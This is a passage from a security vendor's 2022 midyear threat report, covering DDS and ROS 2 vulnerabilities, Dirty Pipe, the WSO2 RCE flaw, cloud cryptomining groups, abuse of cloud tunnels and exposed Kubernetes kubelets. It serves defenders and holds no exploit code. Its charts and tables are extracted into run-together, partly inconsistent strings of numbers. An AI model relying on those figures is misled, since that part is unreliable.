Report35K30K25K20K15K10K5K032,1895,361 5,299976AprDV-41108 DV-4111814,75314,0447 May8,4582,456 Threaten the DDS StandardThe Data Distribution Service (DDS) standard is an example of middleware technology that serves asthe connectivity standard for enabling secure real-time information exchange, modular applicationdevelopment, and rapid integration for the industrial internet of things (IIoT).62 DDS is used to implement areliable communication layer between sensors, controllers, and actuators in areas such as transportation,robotics, telecommunications, healthcare, and defense, making it a critical type of middleware technologydespite not being widely known to the public.In addition to the importance of DDS in the software supply chain, it\u2019s also worth noting that its locationat the beginning of the chain makes it easy to lose track of. As a result, malicious actors see DDS as anattractive target. Since it serves as a security-critical building block of the system, the exploitation of asingle vulnerability has the potential to leave an impact on the rest of the software stack.In January 2022, Trend Micro Research, TXOne Networks, and ZDI in collaboration with ADLINK Labs andAlias Robotics published an entry discussing DDS from a cybersecurity perspective. The entry includedinformation on 13 new vulnerabilities for the six most common DDS implementations.63 These new bugsalso affect Robot Operating System 2 (ROS 2), the default operating system for robotics and automationthat uses DDS as middleware, meaning that the impact of each vulnerability could affect more than justDDS itself.25 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportATT&CK ICSSurfaceVectorCVEScopeCVSSWeaknesses (CWE)T0804: Brute Force I/O T0814: DoS T0827: Loss of Control T0880: Loss of Safety T0846: Remote System Discovery T0856: Spoof of Reporting MessageT0862: Supply Chain T0873: Project File InfectionRTPS discovery packetCVE-2021-38425*Fast-DDS, ROS 2CVE-2021-38429*OpenDDS, ROS 2CVE-2021-38487*Connext DDS, ROS 2CVE-2021-43547*CoreDX DDS, ROS 2NetworkCVE-2021-38447OpenDDS, ROS 2Malformed RTPS LengthCWE-131: Incorrect Calculation of Bu\ufb00er SizeCWE-122: Heap-based Bu\ufb00er Over\ufb02owCWE-121: Stack-based Bu\ufb00er Over\ufb02owCWE-228: Improper Handling of Syntactically Invalid Structure CWE-123: Write-what-where ConditionFigure 20. The 13 new DDS vulnerabilities that were discovered via a collaboration between Trend Micro Research, TXOne Networks, and ZDI in partnership with ADLINK Labs and Alias Robotics; thevulnerabilities cover the network and configuration attack surfaces.The DDS vulnerabilities can be divided into those that affect the network level and those that affect theconfiguration level. The former can be exploited to implement a variety of malicious techniques such asdenial-of-service (DoS) attacks, spoofing, and automated collection, while the latter can be used to targetDDS system developers and integrators.To test how an actual attack might work, our researchers used the Gazebo simulator to create anenvironment using physics engines to mimic a real-world scenario. Using this setup, we were able tosimulate an attack on an autonomous driving platform, thereby crafting a scenario where a maliciousactor can exploit CVE-2021-3844764 and CVE-2021-38445.65 Upon exploitation, the ROS 2 nodes wouldeither crash or allow the attacker to execute arbitrary code within the system.CVE IDDescriptionScopeCVSSRoot CauseCVE-2021-38447CVE-2021-38445An attacker remotely executes arbitrary code due to OCI OpenDDS versions prior to 3.18.1 being unable to handle a length parameter consistent with the actual length of the associated data.An attacker remotely executes arbitrary code due to OCI OpenDDS versions prior to 3.18.1 being unable to handle a length parameter consistent with the actual length of the associated data.OpenDDS, ROS 28.6Resource exhaustionOpenDDS, ROS 27.0Failed assertionFigure 21. Details of how CVE-2021-38447 and CVE-2021-38445 can be exploited to launch an attackon an autonomous driving platform26 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportNotable Vulnerabilities Affecting Non-Windows Operating SystemsSome of the noteworthy vulnerabilities we discovered and analyzed in the first half of 2022 affectedplatforms other than Windows. In April 2022, we released a blog entry about our discovery and analysisof CVE-2022-22639,66 a vulnerability in suhelperd, a helper daemon process for the macOS SoftwareUpdate that contains the class SUHelper. This class is responsible for a critical system service via theinter-process communication (IPC) mechanism. The successful exploitation of CVE-2022-22639 can leadto an attacker gaining root privileges that they can use for malicious attacks.67 Apple has since patchedthis bug via the macOS Monterey 12.3 update released in March 2022.68There were also prominent vulnerabilities affecting Linux- and Unix-based operating systems. CVE-2022-0847, also known as Dirty Pipe,69 is a bug that affects the Linux kernel from versions 5.8 and up. It exploitsa flaw in the Linux kernel\u2019s memory management, specifically through how pipe page caches are mergedand overwrite other page caches.70 Dirty Pipe, which can potentially allow the elevation of an attackerto root privileges on the host, is relatively easy to exploit. It is therefore vital for organizations to checkwhether they are using vulnerable versions of the Linux kernel. Upon learning that these are vulnerable,they must then update their systems according to Linux kernel versions 5.16.11, 5.15.25, and 5.10.102or later.71On the other hand, CVE-2022-2946472 is a critical RCE vulnerability that affects several products fromWSO2, a technology provider that offers open-source platforms for integrating application programminginterfaces (APIs), applications, and web services:\u2022 WSO2 API Manager 2.2.0 and above\u2022\u2022\u2022Identity Server 5.2.0 and aboveIdentity Server Analytics 5.4.0 to 5.6.0Identity Server as Key Manager 5.3.0 and above\u2022 Open Banking AM 1.4.0 and above\u2022 Enterprise Integrator 6.2.0 and above27 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportExploitation of this flaw, which does not require user interaction or administrative privileges, can allowattackers to infiltrate the networks of affected systems.Since April 2022, we have been seeing CVE-2022-29464 exploit attempts in the wild. These attemptsoccurred after a proof of concept for the exploit was published in GitHub.73 Shortly after this was posted,a Metasploit module for affected environments was made available.74 These exploit attempts involve theinstallation of Cobalt Strike beacons and other malware as part of the attack routine.75As with the other vulnerabilities discussed in this section, we encourage organizations using affectedWSO2 products to update their systems or apply the temporary mitigation recommendations as suggestedby their respective security advisories.76 WSO2 has since released a patch addressing this vulnerability.7728 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportOld Issues, Unconventional Attacks Plague Cloud Environments Cloud-Based Cryptocurrency Mining Attacks From Threat Actors Like TeamTNT and Kinsing Are on the RiseCloudtechnologieshaveexperiencedexplosive growth over the last decade,78 withmany organizations shifting at least part of theirinfrastructure to the cloud due to the benefitsit provides, such as cost savings, operationalresilience, business agility, and automation. ThisPredictionsIn our 2022 security predictions, wespeculated that cloud attackers wouldcontinue to follow technology trendswhile still using traditional attacks ontrend is expected to continue in the next few years,cloud users.with Gartner forecasting that public cloud spendingalone will reach nearly US$500 billion in 2022.79While widespread adoption of the cloud has made many businesses run more efficiently, it has also madecloud-based systems an attractive target for malicious actors looking to expand the regular scope of theiroperations.Although cryptocurrency prices declined sharply during the first half of 2022,80 schemes built aroundit do not require high investment costs since typical cryptocurrency-based attacks rely on the victim\u2019sinfrastructure and resources to mine cryptocurrencies.Traditionally, the most efficient method of cryptocurrency mining involved the use of expensive machineswith powerful GPUs. Other types of cryptocurrency mining, such as CPU-based mining, can also beprofitable, but only at scale where sheer numbers can make up for the difference in performance. Sincemost users do not have high-end graphical powerhouses at their disposal, some groups have begun29 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Reportfocusing their efforts on quantity over quality by relying instead on compromising cloud instances forcryptocurrency-mining operations.81In our research into cloud-based cryptocurrency mining, we investigated the primary threat actors thatinhabit this space and determined the five most prominent groups and how they conduct their operations:Outlaw is a threat actor that prefers to stick to the tools and techniques it knows, with relatively littlechange in its operations over the years.82 Outlaw\u2019s preferred targets include IoT devices and Linux cloudservers, which it compromises by exploiting known vulnerabilities or performing brute-force Secure Shell(SSH) attacks.TeamTNT is a group we\u2019ve covered extensively over the past couple of years.83 The threat actor is knownfor being active in social media, going as far as replying to researchers who have analyzed their attacks.TeamTNT has evolved quickly over a short period, making it one of the most technically proficient threatactors focused on cryptocurrency mining. The group\u2019s preferred modus operandi is to exploit vulnerablesoftware to compromise hosts before performing credential theft as a precursor for lateral movementwithin the victim\u2019s system and exploiting misconfigurations.Kinsing, at least in terms of online presence, can be considered an antithesis to TeamTNT since the groupdoes not maintain any noticeable presence on social media or even in underground forums. However, itshares some similarities with its rival in terms of its ability to quickly adapt and evolve its operationalkit.84 The group is also known for its quick adoption of new exploits, as seen in its use of the Log4Shellvulnerability just a few days after it was first made public.858220 is a group that has been a frequent exploiter of vulnerabilities, primarily those that affect OracleWebLogic Server. After a relatively quiet 2020, we observed that the group became much more active in2021, with approximately 10 times the activity levels in the previous year. The threat actor has also beenknown to compete with Kinsing for the same resources, with the two often kicking each other out fromcompromised machines to install their own cryptocurrency miners.Kek Security is a relatively new group that has been garnering attention due to its sophistication andpenchant for integrating new exploits into its attacks. Kek Security is also continuously developingits malware, with some of its more recent additions providing better obfuscation capabilities to evadedetection and prevent researcher analysis.30 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportOutlawActive since 20172018201920202021SophisticationVulnerability exploitationSocial media presenceTeamTNTActive since 20172018201920202021SophisticationVulnerability exploitationSocial media presenceKinsingActive since 20172018201920202021SophisticationVulnerability exploitationSocial media presence8220Active since 20172018201920202021SophisticationVulnerability exploitationSocial media presenceKek SecurityActive since 20172018201920202021SophisticationVulnerability exploitationSocial media presenceFigure 22. A diagram showing the five primary threat actors in the cloud-based cryptocurrency-miningspace, how long they have been active, their level of sophistication, social media presence, andtendency to exploit vulnerabilities as part of their routines31 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportGiven that all these groups are targeting both common and limited resources, we witnessed multipleinstances where different threat actors fought over the same machines, often using kill scripts to deal withcompetitors. It is this cutthroat competition that drives a large portion of the innovations implemented bythe various threat actors. Primarily, these innovations involve adding capabilities that would allow them totarget systems that their adversaries cannot.Malicious Actors Abuse Cloud Tunneling Services for Cloud-Based AttacksSome of the advantages that cloud technologies provide can likewise present security challenges fororganizations. For example, the cloud\u2019s ability to swiftly deploy assets and services helps organizations bemore efficient; however, it can also prevent them from having full visibility over deployed assets. Attackerscan take advantage of this by launching attacks using more unconventional methods in places that ITteams and security staff are less likely to monitor.We recently observed malicious actors abusing cloud tunnels, a service used by both individuals andbusinesses to expose their internal systems to the internet by relaying traffic through cloud-basedinfrastructure. In enterprise settings, these kinds of services are used by developers to test and deploycode, as well as to make certain services available to select users on the internet. In other words, cloudtunneling serves as a convenient tool that allows users to deploy local development services withoutneeding to configure network firewalls and register domain names.Due to its growing popularity, cloud tunneling services have become a prime target for malicious actorslooking to expand their operations. Groups that employ cloud tunneling services normally use them fortransitory purposes so that they will not need to maintain permanent infrastructures, as well as to addanother layer of secrecy by masking their real locations.86Cloud tunneling threats can be categorized into two distinct types: internal threats and external threats.Internal threats refer to attacks where the service is used (either purposefully or unknowingly) to exposeinternal services such as Server Message Block (SMB), FTP, and HTTP. On the other hand, externalthreats involve traditional attacks and routines such as phishing and C&C communication via the cloudtunnel.In one blog entry in September 2020, we discuss an instance where an insider attack involved the abuseof legitimate tools and services. In particular, a malicious actor used ngrok to expose an SMB port,eventually leading to the download and execution of a keylogger.87 In contrast, external attacks are morecommon and usually involve operations that integrate cloud tunneling services for the routing of malwaretraffic or the hosting of phishing websites.32 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportCloud Misconfiguration Remains an Issue for OrganizationsThe growth of the container market, which is estimated to reach US$8.2 billion by 2025, has made itan appealing target for cloud-focused threat actors.88 While containers can provide organizations anincrease in the speed and efficiency of their development cycles, failure to implement proper securitycontrols could result in compromise at various stages of the pipeline, from hijacked repositories to theexploitation of weaknesses in specific components of the container software.89Misconfigured container software remains a significant issue for many organizations. According to asurvey from Red Hat encompassing over 300 DevOps, engineering, and security professionals, 53% ofthe respondents detected a misconfiguration in their container and/or Kubernetes deployment.90We investigated one of the primary misconfiguration issues in Kubernetes deployments, specificallyKubernetes clusters that are publicly exposed via port 10250.91 The kubelet is an integral part of Kubernetes,and it is responsible for ensuring that all containers are running in a pod and performing functions, suchas helping nodes join the Kubernetes cluster, managing the health of containers, and keeping the controlupdated on node information. Port 10250, which is used by the kubelet API, is typically inaccessible toexternal services as it is exposed internally.However, based on Shodan data, we were able to use IP address information and a simple script tosend requests to the kubelet API to identify over 240,000 exposed Kubernetes cluster nodes. Althougha significant number of these nodes returned HTTP \u201c401 Status Code \u2013 Unauthorized,\u201d meaning thatthey were blocking anonymous requests, a skilled malicious actor can still compromise the kubeletauthentication token or use other exploits, thereby endangering the clusters. Approximately 600 nodesreturned the \u201c200 \u2013 OK\u201d notification, resulting in some nodes that are running a kubelet providinginformation on pods in that specific node. For these exposed nodes, an attacker can install and runprograms via the kubelet API.Meanwhile, Trend Micro Cloud One\u2122 Conformity data shows the tools and services with the highestlevels of service misconfiguration rates (based on total checks) from Amazon Web Services (AWS),Microsoft Azure, and Google Cloud Platform (GCP). In particular, Azure\u2019s activity log service had highmisconfiguration rates and was associated with a high number of high-risk rules (based on Conformityrisk level rating).33 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportAmazon Web Services99.4%98.9%95.5%94.7%92.8%Macie2ComprehendCloudWatch LogsCost ExplorerInspector8278760e rulesMicrosoft Azure100%100%99.97%99.26%98.45%4141084AdvisorLocksResourcesActivity LogSearch100806040200020406080100120High-risk rulesGoogle Cloud Platform98.40%Cloud Logging83.60%79.7%66.5%64.05%BigQueryCloud APICloud IAMCloud SQL358416 41161e rulesFigure 23. The top five services with the highest levels of misconfiguration rates (based on total checks)from Amazon Web Services (AWS), Microsoft Azure, and Google Cloud Platform (GCP)34 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportThe Evolving Attack Surface Requires Effective Multilayered Defenses and Security TechnologiesIf there is anything we can glean from the current state of cybersecurity, it\u2019s that the growth of the digitalattack surface has organizations scrambling to fill as many security gaps as they can. After two years ofremote work, some employees have started to shift back in some capacity to their on-site workplaces,while others have adopted a hybrid arrangement. These varying configurations in working environments,together with the growing number of technologies that are being integrated into business operations, area call for organizations to allocate additional resources to cover as much of the attack surface as possible.Over time, threat actors have become more dangerous, launching attacks that have grown in both scaleand sophistication. It comes as no surprise, therefore, that threat actors now exploit multiple sections ofthe attack surface in a single campaign: After all, the rising popularity of service-based malware has madeit easier for cybercriminals to launch attacks and for malware developers to hide their tracks.The evolution of ransomware from the more innocuous attacks of yesteryear to the double \u2014 and eventriple \u2014 extortion schemes of today means that defending systems against modern ransomware familiescannot be viewed as anything less than top priority. In the same vein, widespread technologies suchas cloud services, where organizations do not physically control the infrastructure, must still rely on theshared responsibility model for effective security.92The first step in attack surface management (ASM) is the discovery of the attack surface itself, whereorganizations examine their assets and determine elements such as the critical importance of an asset,any potential vulnerabilities, the level of threat activity, and how much threat intelligence is being gatheredfrom their assets. Assessing available security controls and how they offset risks is also an importantpreliminary step in planning an organization\u2019s ASM.35 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportOne integral component of ASM is visibility, as it provides valuable information on potential threats. Inturn, this can help enterprises determine their risk exposure and allow them to take the necessary stepsto mitigate these risks.93Proper security protocols and best practices go a long way toward helping businesses protect their systemfrom attacks. Organizations should prioritize updating their software as soon as possible to minimize thechance of attackers successfully exploiting vulnerabilities in their system. Other options, such as virtualpatching, can help organizations protect their machines while they wait for vendors to provide securityupdates. Cloud users, meanwhile, should ensure that their cloud infrastructure is set up properly withappropriate security protocols in place to prevent attackers from capitalizing on misconfigurations. Usereducation is also a key part of a successful security posture since end users often serve as the weakestlinks that malicious actors try to exploit to gain access to other parts of an organization\u2019s system.However, the complex reality of securing infrastructure, systems, and endpoints means that even withthese in place, securing each possible point of attack would still be challenging without the right securitytools in place.While there are technologies that can individually handle security for different parts of a system, thesealso come with their own drawbacks, such as the inability to correlate different data points from eachsiloed source. Security teams are thus limited to working with only pieces of the puzzle at a time whentrying to determine how an attack happened and where it came from.A single platform that can cover the entire attack surface is the ideal solution for organizations, especiallythose with limited resources. With a comprehensive platform, organizations stand to gain completevisibility over their attack surface, not to mention the ability to correlate different indicators so that theycan focus on the bigger picture. A unified security platform can also provide multilayered protection whilehelping reduce expenditures that would otherwise be spent on multiple security technologies.94 Lastly, tominimize potential security gaps, this platform must be configurable and capable of providing continuousprotection of digital assets to minimize potential security gaps.36 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportThe Threat Landscape in BriefIn the first half of 2022, the Trend Micro Smart Protection Network protected users from more than 63billion threats consisting of email threats, mobile app threats, IoT threats, network threats, malicious files,and malicious URLs.63,789,373,773 2,911,929,067,913Blocked threatsOverall queriesBlocked email threatsBlocked malicious URLsBlocked malicious files33,316,115,08838,493,160,6921,299,974,1621,398,395,5246,340,820,72322,418,695,205010B20B30B40B0300M600M900M1.2B1.5B05B10B15B20B25BBlocked mobile app threatsBlocked IoT threats18,395,05717,494,6422,197,2182,448,759Blocked Smart HomeNetwork threats1,798,780,1531,459,178,95105M10M15M20M0500K1M1.5M2M2.5M0500M1B1.5B2BEmail reputation queriesURL reputation queriesFile reputation queries42,985,439,36747,042,065,5251,645,676,427,450959,840,620,0621,835,343,686,002988,766,090,746010B20B30B40B50B0500B1T1.5T2T0200B400B600B800B1TMobile reputation app queriesIoT reputation queries22,170,980,58823,953,990,10915,564,853,20016,823,235,53105B10B15B20B25B05B10B15B20B1H 20211H 2022Figure 24. There was an increase in every metric for blocked threats and reputation queries in the first half of 2021 compared to the first half of 2022 based on blocked email, file, and URL threat data and queries in the first half of each year. The number of blocked maliciousfiles also saw a significant increase.Source: Trend Micro Smart Protection Network37 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportThe number of blocked malicious files has been seeing an upward trend since 2020: From just over 1billion blocked files in the first half of 2020, this number has increased to over 22 billion by mid-2022. Inaddition to improvements in the Smart Protection Network\u2019s feedback mechanism during this period, webelieve that both the pandemic and the shift to remote and hybrid work setups also contributed to thisgrowth in detections.25B20B15B10B5B1,028,006,974 01H 202022,418,695,20511,493,987,7156,340,820,7232,670,438,8972H 2022Figure 25. There has been a steady increase in the number of blocked files since the start of 2020,which has doubled approximately each half-year since.Source: Trend Micro Smart Protection NetworkWeb shells were the top malware family in terms of detections in the first half of 2022, followed by Emotet,which had a resurgence this year. Cryptocurrency miners had the third highest number of detections, withthe Ulise and Powload trojans rounding up the top five.160,656148,70163,14338,73136,99829,78227,72027,13624,95723,905WebshellEmotetCoinminerUlisePowloadDLoaderNemucodDownadBondatWannaCry050K100K150K200KFigure 26. The top 10 malware families in terms of detections in the first half of 2022Source: Trend Micro Smart Protection Network38 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportTrend Micro Smart Protection Network data reveals that government, manufacturing, and healthcareremained the industries with the highest number of malware detections in the first half 2022. Still, therewere some changes at the top, with government targets overtaking the manufacturing industry and thetechnology sector replacing banking in the top five.Manufacturing 4.3%Government 2.4%Healthcare 2.1%Manufacturing 2.3%Government 2.3%Healthcare 2.0%Education 1.6%Banking 1.2%Others 88.4%Education 1.6%Technology 1.4%Others 90.4%Figure 27. A comparison of the top five industries with the highest number of malware detections in thefirst half of 2021 and 2022Source: Trend Micro Smart Protection NetworkWe detected significantly fewer new ransomware families in the first half of 2022 vis-\u00e0-vis the first halfof the previous year. However, there were still some noteworthy new ransomware families, such asCheerscrypt, that made their debut this year. It\u2019s also possible that other ransomware operators arestarting to turn toward RaaS and other similar operations instead of developing their own families.49101H 20211H 202201020304050Figure 28. A half-year comparison of the detections of new ransomware familiesSource: Trend Micro Smart Protection Network39 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportJanFebMarAprMayJunNo new familiesNo new familiesExplusCheerscryptKeversenZagreuSNoEscapeStorageCryptLorenzPalangBlazeEvilNominatusTable 3. In the first half of 2022, only 10 new ransomware families were discovered, with no newransomware families in January and February: New ransomware families in the first six months of 2022The Fortinet path traversal vulnerability CVE-2018-13379,95 which occurs in Fortinet\u2019s FortiGate SSL, wasthe top VPN flaw during the first half of the year, peaking in June with over 90,000 exploit attempts.Meanwhile, CVE-2021-22986,96 a bug affecting the iControl REST Interface of the F5 software, had thehighest individual month in terms of exploit attempts with over 100,000 detections in June 2022.CVEDigital VaccinefilterJanFebMarAprMayJunTotalFortinetCVE-2018-13379DV-3608721,71021,73326,40525,07732,59090,700218,215Pulse SecureCitrix SystemsCVE-2019-11510DV-360898,7088,20410,11014,95016,22648,098106,296DV-362415067751,9401,4831,8001,7658,269CVE-2019-11539DV-36095CVE-2021-22893DV-396360000000330102306CVE-2019-19781DV-368761,1206842,0681,1341,7703,36110,137Palo AltoCVE-2019-1579DV-38230DV-369272701506006707604302880F5CVE-2020-5902DV-3784119,33917,58134,50724,88136,07962,302194,689DV-38276 (Malware)0000CVE-2021-22986DV-393601,3202,5031,48117344631301239403924105,4461,87091303SonicWallCVE-2021-20016CiscoCVE-2021-1609CVE-2021-1610DV-39352DV-39364DV-39727 (Malware)DV-41488NoneNone3,1263,4193,4183,88454,692105,075173,6140000000000000000000000000000Table 4. A monthly comparison of detected attempts to exploit notable VPN vulnerabilitiesin the first half of 2022Sources: Trend Micro TippingPoint Threat Protection System, Japan\u2019s Information-Technology PromotionAgency (IPA), and the Japan Computer Emergency Response Team (JPCERT) Coordination Center40 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportThere was an 11.4% increase in blocked IoT threats for the first half of 2022 compared to the first half ofthe previous year, indicating that malicious actors focusing on IoT were more active with their campaignsduring this period.2,197,2182,448,7591H 20211H 2022Figure 29. The number of blocked IoT threats increased by 11.4%: A comparison of blocked IoT threats0500K1M1.5M2M2.5Min the first half of 2022 compared to the first half of 2021Source: Trend Micro Smart Protection NetworkOne of the noteworthy incidents involving IoT platforms occurred when a variant of a modular botnetcalled Cyclops Blink, previously linked to the Sandworm APT group,97 was found to have targeted Asusrouters using a specially designed module that can access an infected device\u2019s flash memory, whichallowed it to retrieve information and even survive system resets.98 Although Cyclops Blink, which hadpreviously attempted to launch attacks on WatchGuard Firebox,99 is regarded as a state-sponsoredbotnet, our research revealed that the targeted devices were not necessarily part of critical infrastructureor industries. It is therefore likely that the attempted attacks on Asus routers were part of its operator\u2019sattempts to expand its infrastructure for future attacks on higher-value targets. Asus has since released asecurity bulletin that offers firmware updates for affected devices.100Upon looking at trends in recent years, we have observed a steady dip in cryptocurrency miner detections,which peaked in 2018. The first half of 2022, for example, saw a noticeable decrease from the previoustwo half-years. One possible reason for this dip is the crash in cryptocurrency prices midyear due tovarious external issues.101 It is likely that this led to cybercriminals\u2019 reduced interest in cryptocurrency-mining schemes.41 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Report787,146563,805307,703186,69889,26570,78274,49076,41963,1431H 20182H 20181H 20192H 20191H 20202H 20201H 20212H 20211H 20220200K400K600K800KFigure 30. A comparison of cryptocurrency miner detections from the first half of 2021to the first half of 2022Source: Trend Micro Smart Protection NetworkHowever, cryptocurrency-mining malware has been seeing growth in Linux operating systems. Halfwaythrough 2022, we observed an approximately 145% increase in detections for Linux-based cryptocurrencyminers as opposed to the same period in 2021.2,6776,5551H 20211H 2022Figure 31. A half-year comparison of the number of detections for Linux-based cryptocurrency miners02K4K6K8Kshowing a 145% growthSource: Trend Micro Smart Protection NetworkWe observed certain cryptocurrency malware-related trends during the first half of 2022.102 For example,the rise of new technologies such as non-fungible tokens (NFTs) has made them prime targets forscammers. Some of the scams we observed involving NFTs include using fake NFT trader domains that42 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Reportare designed to trick users into connecting their wallets to fraudulent sites to open the way for furtherattacks. We also found examples of NFTs with phishing links in the description being airdropped tounwary users \u2014 again to trick them into connecting their wallets.Another trend we recently spotted is the use of Telegram as an avenue for launching cryptocurrencyscams. In one scenario, malicious actors disguised themselves as technical support representatives ina chat group, offering to help cryptocurrency users with their concerns. These fake representatives thentried to convince the victim to visit phishing sites that are designed to steal mnemonic seed phrases \u2014 aseries of unrelated words that are generated when a cryptocurrency wallet is created \u2014 and private keys.We also discovered similar scenarios involving Telegram chat groups, where the group owners pretendedto be legitimate chat group administrators to trick users interested in cryptocurrencies into visiting scamweb pages.Our data shows a slight decrease (4.9%) in mobile device-related malicious samples in the first half of2022 as opposed to the first half of 2021.18,395,05717,494,6421H 20211H 20222000000005M10M15M20MFigure 32. A half-year comparison of the detections of mobile device-related malicious samplesSource: Trend Micro Mobile App Reputation ServiceAs for notable mobile malware-related incidents, we discovered malicious actors publishing fake mobileapps disguised as cryptocurrency-mining software designed to lure users into either subscribing for paidservices or selecting ads offering phony cryptocurrency earnings.103 Upon further analysis, we found thatone of these apps loaded a bogus website asking users to enter their private keys and mnemonic phrases,which would then be collected for future use.43 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity ReportReferences1 Trend Micro. (2022). Trend Micro. \u201cMapping the Digital Attack Surface: Why global organisations are struggling to managecyber risk.\u201d Accessed on July 22, 2022, at url of-man?_ga=2.73724434.1298314925.1653919723-176640189.1651078671.2Joseph C Chen et al. (Jan. 17, 2022). Trend Micro. \u201cDelving Deep: An Analysis of Earth Lusca\u2019s Operations.\u201d Accessed on July 22, 2022, at url sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations. pdf.3 Daniel Lunghi and Jaromir Horejsi. (April 27, 2022). Trend Micro. \u201cOperation Earth Berberoka: An Analysis of a Multivector and Multiplatform APT Campaign Targeting Online Gambling Sites.\u201d Accessed on July 22, 2022, at url com/assets/white_papers/wp-operation-earth-berberoka.pdf.4 Aliakbar Zahravi and Leandro Froes. (May 5, 2022). Trend Micro. \u201cNetDooka Framework Distributed via PrivateLoaderMalware as Part of Pay-Per-Install Service.\u201d Accessed on July 22, 2022, at url netdooka-framework-distributed-via-privateloader-ppi.html.5Intel471. (Feb. 8, 2022). Intel471. \u201cPrivateLoader: The first step in many malware schemes.\u201d Accessed on July 22, 2022, at url Trend Micro. (Dec. 7, 2022). Trend Micro. \u201cToward a New Momentum: Trend Micro Security Predictions for 2022.\u201d Accessedon July 22, 2022, at url predictions-for-2022.pdf.7 Europol. (n.d.). Europol. \u201cWorld\u2019s most dangerous malware EMOTET disrupted through global action.\u201d Accessed on July22, 2022, at url emotet-disrupted-through-global-action.8 Trend Micro. (Dec. 7, 2021). Trend Micro. \u201cMalware Awareness \u2013 EMOTET resurges with new detections.\u201d Accessed on July 22, 2022, at url US&_ga=2.30145279.1991401181.1657506653-177026311.1643353537.9 Yelisey Boguslavskiy and Vitali Kremez. (Dec. 10, 2021). Advintel. \u201cCorporate Loader \u2018Emotet\u2019: History of \u2018X\u2019 Project Return for Ransomware.\u201d Accessed on July 25, 2022, at url return-for-ransomware.10 Adolph Christian Silverio et al. (May 19, 2022). Trend Micro. \u201cBruised but Not Broken: The Resurgence of the Emotet BotnetMalware.\u201d Accessed on July 25, 2022, at url resurgence-of-the-emotet-botnet-malw.html.11 Trend Micro. (March 3, 2022). Trend Micro. \u201cCyberattacks are Prominent in the Russia-Ukraine Conflict.\u201d Accessed on July 25,2022, at url Trustwave. (April 29, 2022). Trustwave. \u201cStormous: The Pro-Russian, Clout Hungry Ransomware Gang Targets the US and Ukraine.\u201d Accessed on July 25, 2022, at url pro-russian-clout-hungry-ransomware-gang-targets-the-us-and-ukraine/.13 Palo Alto Networks. (Feb. 25, 2022). Unit 42. \u201cSpear Phishing Attacks Target Organizations in Ukraine, Payloads Include theDocument Stealer OutSteel and the Downloader SaintBot.\u201d Accessed on July 25, 2022, at url com/ukraine-targeted-outsteel-saintbot/.14 Trend Micro. (March 3, 2022). Trend Micro. \u201cCyberattacks are Prominent in the Russia-Ukraine Conflict.\u201d Accessed on July 25,2022, at url Trend Micro. (n.d.). Trend Micro. \u201cApache Log4j (Log4Shell) Vulnerability.\u201d Accessed on July 25, 2022, at url Carmella Chirinos. (April 12, 2022). Trend Micro. \u201cAnonymous vows to continue cyber war against Putin\u2019s Russia untilaggression in Ukraine stops.\u201d Accessed on July 28, 2022, at url ukraine/.44 | Defending the Expanding Attack Surface: Trend Micro 2022 Midyear Cybersecurity Report17 Miguel Carlo Ang and Earle Maui Earnshaw. (Oct. 25, 2019). Trend Micro. \u201cNegasteal/Agent Tesla, Ave Maria Delivered viaMalspam.\u201d Accessed on July 25, 2022, at url tesla-ave-maria-delivered-via-malspam.html.18 Trend Micro. (n.d.). Trend Micro. \u201cRansomware as a Service (RaaS).\u201d Accessed on July 25, 2022, at url Trend Micro. (May 23, 2022). Trend Micro. \u201cLockbit, Conti, and BlackCat, Lead Pack Amid Rise in Active RaaS and Extortion Groups.\u201d Accessed on July 25, 2022, at url lockbit-conti-and-blackcat-lead-pack-amid-rise-in-active-raas-and-extortion-groups-ransomware-in-q1-2022.20 Trend Micro. (Feb. 8, 2022). Trend Micro. \u201cRansomware Spotlight: LockBit.\u201d Accessed on July 25, 2022, at url Lisa Vaas. (Aug. 11, 2021). Threat Post. \u201cAccenture Confirms LockBit Ransomware Attack.\u201d Accessed on July 25, 2022, aturl Trend Micro. (Sept. 24, 2020). Trend Micro. \u201cAddressing Threats Like Ryuk via Trend Micro XDR.\u201d Accessed on July 25, 2022, at url micro-xdr.23 Radio New Zealand. (May 18, 2021). Radio New Zealand. \u201cWaikato hospitals hit by cyber security incident.\u201d Accessed on July25, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2018-13379.\u201d Accessed on July25, 2022, at url Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2018-13374.\u201d Accessed on July25, 2022, at url Lawrence Abrams. (Sept. 21, 2021). Bleeping Computer. \u201cConti ransomware now hacking Exchange servers with ProxyShell exploits.\u201d Accessed on July 25, 2022, at url exchange-servers-with-proxyshell-exploits/.27 Common Vulnerabilities and Exposures. (n.d.). Common Vulnerabilities and Exposures. \u201cCVE-2020-1472.\u201d Accessed on July25, 2022, at url Monica Buchanan Pitrelli. (April 13, 2022). CNBC. \u201cLeaked documents show notorious ransomware group has an HR department, performance reviews and an \u2018employee of the month\u2019.\u201d Accessed on July 25, 2022, at url com/2022/04/14/conti-ransomware-leak-shows-group-operates-like-normal-tech-company.html.29 